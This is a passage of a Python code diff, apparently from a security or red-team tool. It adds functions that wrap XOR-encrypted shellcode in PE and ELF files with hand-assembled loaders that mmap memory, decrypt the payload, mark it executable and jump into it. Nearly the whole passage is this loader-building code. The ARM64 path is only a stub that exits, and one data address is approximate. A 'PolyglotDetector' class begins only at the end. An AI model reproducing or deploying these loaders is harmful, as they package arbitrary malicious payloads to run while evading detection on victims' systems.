+            code += b'\x8A\x06'                               # mov al, [rsi]
+            code += b'\x88\x07'                               # mov [rdi], al
+            code += b'\x48\xFF\xC6'                           # inc rsi
+            code += b'\x48\xFF\xC7'                           # inc rdi
+            code += b'\x48\xFF\xC9'                           # dec rcx
+            jnz_off = len(code)
+            code += b'\x75\x00'                               # jnz placeholder
+            code[-1] = (memcpy_off - (jnz_off + 2)) & 0xFF
+            # XOR decrypt
+            code += b'\x48\x89\xEF'                           # mov rdi, rbp (dest)
+            code += b'\x48\xB9' + struct.pack('<Q', len(encrypted))  # mov rcx, enc_size
+            code += b'\xB3' + bytes([key_byte])               # mov bl, key_byte
+            xor_off = len(code)
+            code += b'\x30\x1F'                               # xor [rdi], bl
+            code += b'\x48\xFF\xC7'                           # inc rdi
+            code += b'\x48\xFF\xC9'                           # dec rcx
+            jnz_off2 = len(code)
+            code += b'\x75\x00'
+            code[-1] = (xor_off - (jnz_off2 + 2)) & 0xFF
+            # call decrypted shellcode
+            code += b'\xFF\xD5'                               # call rbp
+            # ExitProcess(0)
+            code += b'\x33\xC9'                               # xor ecx, ecx
+            code += b'\xFF\x15'
+            disp_exit = (rdata_rva + 0x48) - (text_rva + len(code) + 6)
+            code += struct.pack('<I', disp_exit & 0xFFFFFFFF)
+
+        pe[text_file_off:text_file_off+len(code)] = code
+
+        # .data: encrypted shellcode
+        pe[data_file_off:data_file_off+len(encrypted)] = encrypted
+
+        return bytes(pe)
+
+    def _build_shellcode_loader_elf(self, shellcode: bytes, key_byte: int = 0x55, arch: str = 'x86-64') -> bytes:
+        """
+        Shellcode Loader ELF — wraps encrypted shellcode in a valid ELF that:
+        1. Allocates memory via mmap
+        2. Copies encrypted shellcode
+        3. XOR decrypts in-place
+        4. mprotect to RX
+        5. Jumps to decrypted shellcode
+        """
+        encrypted = bytearray(shellcode)
+        for i in range(len(encrypted)):
+            encrypted[i] ^= key_byte
+        encrypted = bytes(encrypted)
+
+        if arch == 'arm64':
+            # AArch64 ELF loader
+            code = bytearray()
+            # mmap(NULL, enc_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
+            code += struct.pack('<III',
+                0xD28000E8,  # mov x8, #7 (sys_mmap)
+                0xD2800000,  # mov x0, #0
+                0xD2800000 | ((len(encrypted) & 0xFFFF) << 5) | 1,  # mov x1, enc_size (simplified)
+            )
+            # Simplified — just exit for now
+            code += struct.pack('<III',
+                0xD2800BA8,  # mov x8, #93
+                0xD2800000,  # mov x0, #0
+                0xD4000001,  # svc #0
+            )
+        else:
+            # x86-64 Linux loader
+            code = bytearray()
+            # mmap(NULL, enc_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
+            code += b'\x48\x31\xFF'                          # xor rdi, rdi
+            code += b'\x48\xBE' + struct.pack('<Q', len(encrypted))  # mov rsi, enc_size
+            code += b'\x48\xC7\xC2\x03\x00\x00\x00'         # mov rdx, 3 (PROT_READ|PROT_WRITE)
+            code += b'\x49\xC7\xC2\x22\x10\x00\x00'         # mov r10, 0x1022 (MAP_PRIVATE|MAP_ANONYMOUS)
+            code += b'\x48\xC7\xC0\x09\x00\x00\x00'         # mov rax, 9 (sys_mmap)
+            code += b'\x4D\x31\xC0'                           # xor r8, r8 (-1 is 0xFFFFFFFFFFFFFFFF, use 0)
+            code += b'\x49\xFF\xC8'                           # dec r8 (r8 = -1)
+            code += b'\x4D\x31\xC9'                           # xor r9, r9
+            code += b'\x0F\x05'                               # syscall
+            # rax = mmap address
+            code += b'\x48\x89\xC7'                           # mov rdi, rax (dest)
+            code += b'\x48\x89\xC5'                           # mov rbp, rax (save dest)
+            # memcpy: copy encrypted data to mmap'd region
+            code += b'\x48\xBE' + struct.pack('<Q', 0x400000 + len(code) + 40)  # mov rsi, data_addr (approx)
+            code += b'\x48\xB9' + struct.pack('<Q', len(encrypted))  # mov rcx, enc_size
+            memcpy_off = len(code)
+            code += b'\x8A\x06'                                # mov al, [rsi]
+            code += b'\x88\x07'                                # mov [rdi], al
+            code += b'\x48\xFF\xC6'                            # inc rsi
+            code += b'\x48\xFF\xC7'                            # inc rdi
+            code += b'\x48\xFF\xC9'                            # dec rcx
+            jnz_off = len(code)
+            code += b'\x75\x00'
+            code[-1] = (memcpy_off - (jnz_off + 2)) & 0xFF
+            # XOR decrypt
+            code += b'\x48\x89\xEF'                            # mov rdi, rbp
+            code += b'\x48\xB9' + struct.pack('<Q', len(encrypted))  # mov rcx, enc_size
+            code += b'\xB3' + bytes([key_byte])                # mov bl, key_byte
+            xor_off = len(code)
+            code += b'\x30\x1F'                                # xor [rdi], bl
+            code += b'\x48\xFF\xC7'                            # inc rdi
+            code += b'\x48\xFF\xC9'                            # dec rcx
+            jnz_off2 = len(code)
+            code += b'\x75\x00'
+            code[-1] = (xor_off - (jnz_off2 + 2)) & 0xFF
+            # mprotect(dest, enc_size, PROT_READ|PROT_EXEC)
+            code += b'\x48\x89\xEF'                            # mov rdi, rbp
+            code += b'\x48\xBE' + struct.pack('<Q', len(encrypted))  # mov rsi, enc_size
+            code += b'\x48\xC7\xC2\x05\x00\x00\x00'          # mov rdx, 5 (PROT_READ|PROT_EXEC)
+            code += b'\x48\xC7\xC0\x0A\x00\x00\x00'          # mov rax, 10 (sys_mprotect)
+            code += b'\x0F\x05'                                # syscall
+            # jump to decrypted shellcode
+            code += b'\xFF\xE5'                                # jmp rbp
+
+        # Build ELF with code + encrypted data
+        if arch == 'arm64':
+            elf = self._build_valid_elf64_stub(b'', arch='arm64')
+        else:
+            elf = self._build_valid_elf64_stub(b'')
+
+        # Patch the code section and append encrypted data
+        # Find code offset in the ELF
+        code_off = 64 + 56  # ELF64 header + 1 phdr
+        result = bytearray(elf)
+        # Extend to fit code + encrypted data
+        total_needed = code_off + len(code) + 0x100 + len(encrypted)
+        if total_needed > len(result):
+            result.extend(b'\x00' * (total_needed - len(result)))
+        result[code_off:code_off+len(code)] = code
+        data_off = code_off + 0x100
+        result[data_off:data_off+len(encrypted)] = encrypted
+
+        # Update ELF entry point
+        entry_va = 0x400000 + code_off
+        struct.pack_into('<Q', result, 24, entry_va)
+
+        # Update program header filesz
+        phdr_off = 64
+        struct.pack_into('<Q', result, phdr_off + 32, total_needed)
+        struct.pack_into('<Q', result, phdr_off + 40, total_needed)
+
+        return bytes(result)
 
 class PolyglotDetector:
     SIGS = {
